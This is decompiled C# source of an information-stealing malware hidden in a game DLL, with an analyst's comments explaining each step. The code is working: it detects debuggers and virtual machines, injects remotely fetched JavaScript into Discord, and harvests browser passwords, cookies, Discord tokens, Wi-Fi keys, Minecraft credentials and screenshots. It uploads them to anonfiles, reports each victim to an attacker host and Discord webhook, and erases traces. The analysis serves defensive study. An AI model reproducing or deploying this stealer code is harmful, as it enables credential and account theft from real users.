// Decompiled with JetBrains decompiler
// Type: MegaGigaPowerfulStealer.ProgramMa
// Assembly: GameDep, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0FAA85E1-7395-44B4-AB8C-F4AF88642E49
// Assembly location: C:\Users\burne\Desktop\dope planes and cars game\GameDep.dll

using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Xml;

namespace MegaGigaPowerfulStealer
{
    public class ProgramMa
    {
        /// <summary>
        /// #18a
        /// Draws text over the bitmap to inform the attacker what the error that happened was.
        /// </summary>
        /// <param name="text"></param>
        /// <param name="font"></param>
        /// <param name="textColor"></param>
        /// <param name="backColor"></param>
        /// <returns></returns>
        private static Bitmap DrawText(string text, Font font, System.Drawing.Color textColor, System.Drawing.Color backColor)
        {
            Image image1 = (Image)new Bitmap(1, 1);
            Graphics graphics1 = Graphics.FromImage(image1);
            SizeF sizeF = graphics1.MeasureString(text, font);
            image1.Dispose();
            graphics1.Dispose();
            Image image2 = (Image)new Bitmap((int)sizeF.Width, (int)sizeF.Height);
            Graphics graphics2 = Graphics.FromImage(image2);
            graphics2.Clear(backColor);
            Brush brush = (Brush)new SolidBrush(textColor);
            graphics2.DrawString(text, font, brush, 0.0f, 0.0f);
            graphics2.Save();
            brush.Dispose();
            graphics2.Dispose();
            return (Bitmap)image2;
        }

        /// <summary>
        /// #17
        /// Takes a screenshot of every active screen.
        /// </summary>
        /// <returns>A bitmap list containing a screenshot of every monitor</returns>
        private static List<Bitmap> CaptureMyScreen()
        {
            List<Bitmap> bitmapList = new List<Bitmap>();
            try
            {
                for (int index = 0; index < ((IEnumerable<Screen>)Screen.AllScreens).Count<Screen>(); ++index)
                {
                    Rectangle bounds1 = Screen.AllScreens[index].Bounds;
                    int width = bounds1.Width;
                    bounds1 = Screen.AllScreens[index].Bounds;
                    int height = bounds1.Height;
                    Bitmap bitmap = new Bitmap(width, height, PixelFormat.Format32bppArgb);
                    Rectangle bounds2 = Screen.AllScreens[index].Bounds;
                    Graphics.FromImage((Image)bitmap).CopyFromScreen(bounds2.Left, bounds2.Top, 0, 0, bounds2.Size);
                    bitmapList.Add(bitmap);
                }
                return bitmapList;
            }
            catch (Exception ex)
            {
                bitmapList.Add(ProgramMa.DrawText("An error occured", new Font("Arial", 20f), System.Drawing.Color.Black, System.Drawing.Color.White));
                return bitmapList;
            }
        }

        /// <summary>
        /// #19
        /// Posts to the endpoint "New victim" with the anonfiles link to the victim's data appended.
        /// </summary>
        /// <param name="msg"></param>
        private static void SendMessage(string msg)
        {
            HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://kiurah.club/kiefgrabber?webhook=" + Settings.Webhook);
            httpWebRequest.Method = "POST";
            httpWebRequest.ContentType = "application/json";
            string str = msg;
            using (StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
                streamWriter.Write(str);
            using (StreamReader streamReader = new StreamReader(httpWebRequest.GetResponse().GetResponseStream()))
                streamReader.ReadToEnd();
        }

        /// <summary>
        /// #7
        /// Checks the appdata to see if discord is installed.
        /// </summary>
        /// <returns>a list of directorys in appdata containing "cord" in the name </returns>
        private static List<string> GetDiscords()
        {
            List<string> stringList = new List<string>();
            foreach (string directory in Directory.GetDirectories(Environment.GetEnvironmentVariable("LocalAppData")))
            {
                if (directory.Contains("cord"))
                    stringList.Add(directory);
            }
            return stringList;
        }

        /// <summary>
        /// #8
        /// Verifies that discord is installed, rather than it being another app with "cord" in the name.
        /// Stolen from Stanley-GF's PirateStealer https://github.com/Stanley-GF/PirateStealer/blob/9ac7cd3c8b8b3b3003383e01ffcfa2d99b68ae6e/src/Injector/PirateMonsterInjector/Program.cs#L29
        /// </summary>
        /// <param name="direct"></param>
        /// <returns>The directory to index.js if discord installed</returns>
        private static string GetIndex(string direct)
        {
            string str = "";
            try
            {
                foreach (string directory1 in Directory.GetDirectories(direct))
                {
                    if (directory1.Contains("app-"))
                    {
                        foreach (string directory2 in Directory.GetDirectories(directory1))
                        {
                            if (directory2.Contains("modules"))
                            {
                                foreach (string directory3 in Directory.GetDirectories(directory2))
                                {
                                    if (directory3.Contains("discord_desktop_core"))
                                    {
                                        Directory.CreateDirectory(directory3 + "\\discord_desktop_core\\PirateStealerBTW");
                                        str = directory3 + "\\discord_desktop_core\\index.js";
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                str = "Discord Not Found";
            }
            return str;
        }
        /// <summary>
        /// #6
        /// A very rudimentary way of killing the discord application.
        /// </summary>
        private static void DiscordProcesses()
        {
            foreach (Process process in Process.GetProcesses())
            {
                if (process.ProcessName.Contains("iscord"))
                    process.Kill();
            }
        }

        /// <summary>
        /// #5
        /// From what I can tell, this injects a javsacript file into the discord console executing a script that has the ability to do the following:
        /// Check the users's badges
        /// Change the email and password,
        /// Buy Discord Nitro.
        /// 
        /// I believe this is how it works, though I cannot confirm due to the amount of obfuscation there is. The code executes, it logs into the discord account,
        /// checks to see if they have certain badges or nitro, if they do it steals the account. I was informed by a victim that the attacker stole their account due to their "early supporter" badge.
        /// 
        /// I have put the original obfuscated javascript file in the "JS" folder along with the lesser obfuscated version. The link to the javascript is:
        /// https://kiurah.club/kiefgrabberstr?webhook=https://discord.com/api/webhooks/882341489915617302/fQMaUDxd8d1R4eAkI3rQV2WfA7YKrkd07GZPwikidlBP_WRNwCKPKA7lsmI2zKQP_kmI
        /// </summary>
        private static void InjectInDiscords()
        {
            ProgramMa.DiscordProcesses();
            string contents = new WebClient().DownloadString("https://kiurah.club/kiefgrabberstr?webhook=" + Settings.Webhook);
            Console.Write(contents);
            foreach (string discord in ProgramMa.GetDiscords())
            {
                try
                {
                    System.IO.File.WriteAllText(ProgramMa.GetIndex(discord), contents);
                }
                catch (Exception ex)
                {
                }
            }
        }

        /// <summary>
        /// #3
        /// This is just checking if the debugger is attached, if it is it doesn't run the code.
        /// </summary>
        private static void DetectDebug()
        {
            if (!Debugger.IsAttached)
                return;
            Environment.Exit(0);
        }

        /// <summary>
        /// #4
        /// This was copy and pasted from NightFallGT's Mercurial Grabber, all it does is check if it's in a virtualized or sandboxed environment.
        /// Source: https://github.com/NightfallGT/Mercurial-Grabber/blob/dd3b8a8d1573768bec7aadb3d9bb809514c942f6/Mercurial/Resources/Program.cs#L62
        /// </summary>
        private static void DetectRegistry()
        {
            Console.WriteLine("Credit to NightfallGT");
            List<string> stringList1 = new List<string>();
            List<string> stringList2 = new List<string>()
      {
        "vmware",
        "virtualbox",
        "vbox",
        "qemu",
        "xen"
      };
            string[] strArray1 = new string[7]
            {
        "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier",
        "SYSTEM\\CurrentControlSet\\Enum\\SCSI\\Disk&Ven_VMware_&Prod_VMware_Virtual_S",
        "SYSTEM\\CurrentControlSet\\Control\\CriticalDeviceDatabase\\root#vmwvmcihostdev",
        "SYSTEM\\CurrentControlSet\\Control\\VirtualDeviceDrivers",
        "SOFTWARE\\VMWare, Inc.\\VMWare Tools",
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "HARDWARE\\ACPI\\DSDT\\VBOX_"
            };
            string[] strArray2 = new string[6]
            {
        "SYSTEM\\ControlSet001\\Services\\Disk\\Enum\\0",
        "HARDWARE\\Description\\System\\SystemBiosInformation",
        "HARDWARE\\Description\\System\\VideoBiosVersion",
        "HARDWARE\\Description\\System\\SystemManufacturer",
        "HARDWARE\\Description\\System\\SystemProductName",
        "HARDWARE\\Description\\System\\Logical Unit Id 0"
            };
            foreach (string name in strArray1)
            {
                if (Registry.LocalMachine.OpenSubKey(name, false) != null)
                    stringList1.Add("HKLM:\\" + name);
            }
            foreach (string path in strArray2)
            {
                string name = new DirectoryInfo(path).Name;
                string str1 = (string)Registry.LocalMachine.OpenSubKey(Path.GetDirectoryName(path), false).GetValue(name);
                foreach (string str2 in stringList2)
                {
                    if (!string.IsNullOrEmpty(str1) && str1.ToLower().Contains(str2.ToLower()))
                        stringList1.Add("HKLM:\\" + path + " => " + str1);
                }
            }
            if (stringList1.Count == 0)
                return;
            Environment.Exit(0);
        }

        /// <summary>
        /// #2
        /// This is just the intilization, it gets excuted in the Main function in KsGrabber.cs
        /// </summary>
        /// <param name="webhook">Hardcoded to be https://discord.com/api/webhooks/882341489915617302/fQMaUDxd8d1R4eAkI3rQV2WfA7YKrkd07GZPwikidlBP_WRNwCKPKA7lsmI2zKQP_kmI </param>
        public static void Start(string webhook)
        {
            Settings.Webhook = webhook;
            ProgramMa.DetectDebug();
            ProgramMa.DetectRegistry();
            ProgramMa.InjectInDiscords();


            /// Both of these try statements are to delete the dependencies so they can be overwritten on the next line. 
            try
            {
                foreach (string file in Directory.GetFiles(Directory.GetCurrentDirectory() + "\\x86"))
                    System.IO.File.Delete(file);
                Directory.Delete(Directory.GetCurrentDirectory() + "\\x86");
            }
            catch (Exception ex)
            {
            }
            try
            {
                foreach (string file in Directory.GetFiles(Directory.GetCurrentDirectory() + "\\x64"))
                    System.IO.File.Delete(file);
                Directory.Delete(Directory.GetCurrentDirectory() + "\\x64");
            }
            catch (Exception ex)
            {
            }

            /// I'm unsure as to why they do this considering both .DLLs are already bundled with the malware in the .RAR. Truthfully, I'm not even sure why he's requiring a SQLite DLL,
            /// it's only used by CockyGrabber and even then it shouldn't be an external dependency since they're using system.data.sqlite. 
            new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/868828366495682630/868828420061134908/Debug.zip", "file.zip");
            ZipFile.ExtractToDirectory("file.zip", Directory.GetCurrentDirectory());
            System.IO.File.Delete("file.zip");
            
            /// They're just trying to create the path and if there are any files in the path(from previous attempts to steal data) it deletes them.
            string path = Path.GetTempPath() + "\\KSGrabber";
            try
            {
                Directory.CreateDirectory(path);
            }
            catch (Exception ex)
            {
            }
            foreach (string file in Directory.GetFiles(path))
                System.IO.File.Delete(file);
            try
            {
                Directory.Delete(path);
            }
            catch (Exception ex)
            {
            }
            try
            {
                System.IO.File.Delete(Path.GetTempPath() + "\\" + Environment.UserName + "KSGrabbed.zip");
            }
            catch (Exception ex)
            {
            }
            /// Creates a list of the tokens followed by the return character.
            IEnumerable<string> strings = Stealer.GetDiscordPath().Distinct<string>();
            string contents = "";
            foreach (string str in strings)
                contents = contents + str + "\n";

            /// Dumps the contents of anything that's stolen into a .KSGrabber file, which is just a text file. 
            Directory.CreateDirectory(Path.GetTempPath() + "\\KSGrabber");
            string str1 = Path.GetTempPath() + "\\KSGrabber";
            System.IO.File.WriteAllText(str1 + "\\Passwords.KSGrabber", Stealer.GetPasswords());
            System.IO.File.WriteAllText(str1 + "\\Cookies.KSGrabber", Stealer.GetCookies());
            System.IO.File.WriteAllText(str1 + "\\Discord.KSGrabber", contents);
            System.IO.File.WriteAllText(str1 + "\\Wifi.KSGrabber", ProgramMa.WifiSteal());
            System.IO.File.WriteAllText(str1 + "\\Minecraft.KSGrabber", ProgramMa.MinecraftSteal());
            System.IO.File.WriteAllText(str1 + "\\ComputerInfo.KSGrabber", ProgramMa.UserInfo());

            /// Takes a screenshot of every monitor and saves them as a .png.
            for (int index = 0; index < ProgramMa.CaptureMyScreen().Count; ++index)
                ProgramMa.CaptureMyScreen()[index].Save(str1 + "\\Screen " + index.ToString() + 1.ToString() + ".png");

            /// Creates a zip containing the user's data, uploads it to anonfiles and posts to the endpoint for the attacker to download.
            ZipFile.CreateFromDirectory(str1, Path.GetTempPath() + "\\" + Environment.UserName + "KSGrabbed.zip");
            string downloadLink = ProgramMa.CreateDownloadLink(Path.GetTempPath() + "\\" + Environment.UserName + "KSGrabbed.zip");
            ProgramMa.MessageContent messageContent = new ProgramMa.MessageContent();
            messageContent.content = "New Victim: \n" + downloadLink;
            Console.WriteLine(JsonConvert.SerializeObject((object)messageContent));
            ProgramMa.SendMessage(JsonConvert.SerializeObject((object)messageContent));

            /// Cleaning up the directory, deleting any evidence.
            foreach (string file in Directory.GetFiles(str1))
                System.IO.File.Delete(file);
            Directory.Delete(str1);
            System.IO.File.Delete(Path.GetTempPath() + "\\" + Environment.UserName + "KSGrabbed.zip");
            try
            {
                foreach (string file in Directory.GetFiles(Directory.GetCurrentDirectory() + "\\x86"))
                    System.IO.File.Delete(file);
                Directory.Delete(Directory.GetCurrentDirectory() + "\\x86");
            }
            catch (Exception ex)
            {
            }
            try
            {
                foreach (string file in Directory.GetFiles(Directory.GetCurrentDirectory() + "\\x64"))
                    System.IO.File.Delete(file);
                Directory.Delete(Directory.GetCurrentDirectory() + "\\x64");
            }
            catch (Exception ex)
            {
            }
        }

        /// <summary>
        /// 18b
        /// Uploads the zip file containing the user's data to anonfiles.
        /// </summary>
        /// <param name="File"></param>
        /// <returns>The link if it worked, otherwise an error message</returns>
        private static string CreateDownloadLink(string File)
        {
            string str1 = string.Empty;
            try
            {
                using (WebClient webClient = new WebClient())
                {
                    string str2 = Encoding.ASCII.GetString(webClient.UploadFile("https://api.anonfiles.com/upload", File));
                    if (str2.Contains("\"error\": {"))
                    {
                        str1 += "There was a erorr while uploading the file.\r\n";
                        str1 = str1 + "Error message: " + str2.Split('"')[7] + "\r\n";
                    }
                    else
                    {
                        str1 = str1 + "Download link: " + str2.Split('"')[15] + "\r\n";
                        str1 = str1 + "File name: " + str2.Split('"')[25] + "\r\n";
                    }
                }
            }
            catch (Exception ex)
            {
                str1 = str1 + "Exception Message:\r\n" + ex.Message + "\r\n";
            }
            return str1;
        }

        /// <summary>
        /// #16
        /// Collects more information about the user's machine and network connection.
        /// </summary>
        /// <returns>A collection of information about the user's machine and network</returns>
        private static string UserInfo()
        {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine("Username:" + Environment.UserName);
            stringBuilder.AppendLine("Machine Name: " + Environment.MachineName);
            stringBuilder.AppendLine("User Domain Name: " + Environment.UserDomainName);
            stringBuilder.AppendLine("IP Address: " + new WebClient().DownloadString("https://www.myexternalip.com/raw"));
            stringBuilder.AppendLine("Hostname: " + Dns.GetHostName());
            stringBuilder.AppendLine("Current Directory: " + Environment.CurrentDirectory);
            return stringBuilder.ToString();
        }

        /// <summary>
        /// #15
        /// Checks to see if the minecraft directory exists, if it does it attemps to take the user's credentials.
        /// </summary>
        /// <returns>User's credentials if there are any, otherwise "doesn't not have Minecraft on his computer."</returns>
        private static string MinecraftSteal() => System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\launcher_accounts.json") ? System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\launcher_accounts.json") : Environment.UserName + " doesn't not have Minecraft on his computer.";

        /// <summary>
        /// #14
        /// Steals the any and all WIFI SSIDs/passwords.
        /// </summary>
        /// <returns>A collection of WIFI SSIDs/Passwords</returns>
        private static string WifiSteal()
        {
            StringBuilder stringBuilder = new StringBuilder();
            IntPtr zero1 = IntPtr.Zero;
            IntPtr pdwNegotiatedVersion = IntPtr.Zero;
            IntPtr zero2 = IntPtr.Zero;
            IntPtr zero3 = IntPtr.Zero;
            string profileXml = (string)null;
            IntPtr pdwGrantedAccess = IntPtr.Zero;
            IntPtr zero4 = IntPtr.Zero;
            try
            {
                ProgramMa.WlanOpenHandle(2, IntPtr.Zero, out pdwNegotiatedVersion, ref zero1);
                int num1 = (int)ProgramMa.WlanEnumInterfaces(zero1, IntPtr.Zero, ref zero2);
                Guid interfaceGuid = new ProgramMa.WLAN_INTERFACE_INFO_LIST(zero2).InterfaceInfo[0].InterfaceGuid;
                int profileList = (int)ProgramMa.WlanGetProfileList(zero1, interfaceGuid, IntPtr.Zero, ref zero4);
                ProgramMa.WLAN_PROFILE_INFO_LIST wlanProfileInfoList = new ProgramMa.WLAN_PROFILE_INFO_LIST(zero4);
                for (int index = 0; index < wlanProfileInfoList.dwNumberOfItems; ++index)
                {
                    try
                    {
                        string strProfileName = wlanProfileInfoList.ProfileInfo[index].strProfileName;
                        int flags = 63;
                        int profile = (int)ProgramMa.WlanGetProfile(zero1, interfaceGuid, strProfileName, IntPtr.Zero, out profileXml, ref flags, out pdwGrantedAccess);
                        XmlDocument xmlDocument = new XmlDocument();
                        xmlDocument.LoadXml(profileXml);
                        XmlNodeList xmlNodeList1 = xmlDocument.SelectNodes("//*[name()='WLANProfile']/*[name()='SSIDConfig']/*[name()='SSID']/*[name()='name']");
                        XmlNodeList xmlNodeList2 = xmlDocument.SelectNodes("//*[name()='WLANProfile']/*[name()='MSM']/*[name()='security']/*[name()='sharedKey']/*[name()='keyMaterial']");
                        foreach (XmlNode xmlNode1 in xmlNodeList1)
                        {
                            stringBuilder.AppendLine("Wifi Name: " + xmlNode1.InnerText);
                            foreach (XmlNode xmlNode2 in xmlNodeList2)
                                stringBuilder.AppendLine("Wifi Password: " + xmlNode2.InnerText);
                            stringBuilder.AppendLine("\n\n");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                }
                int num2 = (int)ProgramMa.WlanCloseHandle(zero1, IntPtr.Zero);
                return stringBuilder.ToString();
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        [DllImport("Wlanapi.dll")]
        public static extern int WlanOpenHandle(
          int dwClientVersion,
          IntPtr pReserved,
          out IntPtr pdwNegotiatedVersion,
          ref IntPtr ClientHandle);

        [DllImport("Wlanapi")]
        public static extern uint WlanCloseHandle([In] IntPtr hClientHandle, IntPtr pReserved);

        [DllImport("Wlanapi")]
        public static extern uint WlanEnumInterfaces(
          [In] IntPtr hClientHandle,
          IntPtr pReserved,
          ref IntPtr ppInterfaceList);

        [DllImport("wlanapi.dll", SetLastError = true)]
        public static extern uint WlanGetProfile(
          [In] IntPtr clientHandle,
          [MarshalAs(UnmanagedType.LPStruct), In] Guid interfaceGuid,
          [MarshalAs(UnmanagedType.LPWStr), In] string profileName,
          [In] IntPtr pReserved,
          [MarshalAs(UnmanagedType.LPWStr)] out string profileXml,
          [In, Out, Optional] ref int flags,
          [Optional] out IntPtr pdwGrantedAccess);

        [DllImport("wlanapi.dll", SetLastError = true)]
        public static extern uint WlanGetProfileList(
          [In] IntPtr clientHandle,
          [MarshalAs(UnmanagedType.LPStruct), In] Guid interfaceGuid,
          [In] IntPtr pReserved,
          ref IntPtr profileList);

        public class MessageContent
        {
            public string content { get; set; }
        }

        public struct WLAN_INTERFACE_INFO_LIST
        {
            public int dwNumberofItems;
            public int dwIndex;
            public ProgramMa.WLAN_INTERFACE_INFO[] InterfaceInfo;

            public WLAN_INTERFACE_INFO_LIST(IntPtr pList)
            {
                this.dwNumberofItems = (int)Marshal.ReadInt64(pList, 0);
                this.dwIndex = (int)Marshal.ReadInt64(pList, 4);
                this.InterfaceInfo = new ProgramMa.WLAN_INTERFACE_INFO[this.dwNumberofItems];
                for (int index = 0; index < this.dwNumberofItems; ++index)
                {
                    IntPtr ptr = new IntPtr(pList.ToInt64() + (long)(index * 532) + 8L);
                    ProgramMa.WLAN_INTERFACE_INFO wlanInterfaceInfo = new ProgramMa.WLAN_INTERFACE_INFO();
                    ProgramMa.WLAN_INTERFACE_INFO structure = (ProgramMa.WLAN_INTERFACE_INFO)Marshal.PtrToStructure(ptr, typeof(ProgramMa.WLAN_INTERFACE_INFO));
                    this.InterfaceInfo[index] = structure;
                }
            }
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct WLAN_INTERFACE_INFO
        {
            public Guid InterfaceGuid;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string strInterfaceDescription;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct WLAN_PROFILE_INFO
        {
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string strProfileName;
            public ProgramMa.WlanProfileFlags ProfileFLags;
        }

        [System.Flags]
        public enum WlanProfileFlags
        {
            AllUser = 0,
            GroupPolicy = 1,
            User = 2,
        }

        public struct WLAN_PROFILE_INFO_LIST
        {
            public int dwNumberOfItems;
            public int dwIndex;
            public ProgramMa.WLAN_PROFILE_INFO[] ProfileInfo;

            public WLAN_PROFILE_INFO_LIST(IntPtr ppProfileList)
            {
                this.dwNumberOfItems = (int)Marshal.ReadInt64(ppProfileList);
                this.dwIndex = (int)Marshal.ReadInt64(ppProfileList, 4);
                this.ProfileInfo = new ProgramMa.WLAN_PROFILE_INFO[this.dwNumberOfItems];
                IntPtr num = new IntPtr(ppProfileList.ToInt64() + 8L);
                for (int index = 0; index < this.dwNumberOfItems; ++index)
                {
                    ppProfileList = new IntPtr(num.ToInt64() + (long)(index * Marshal.SizeOf(typeof(ProgramMa.WLAN_PROFILE_INFO))));
                    this.ProfileInfo[index] = (ProgramMa.WLAN_PROFILE_INFO)Marshal.PtrToStructure(ppProfileList, typeof(ProgramMa.WLAN_PROFILE_INFO));
                }
            }
        }
    }
}
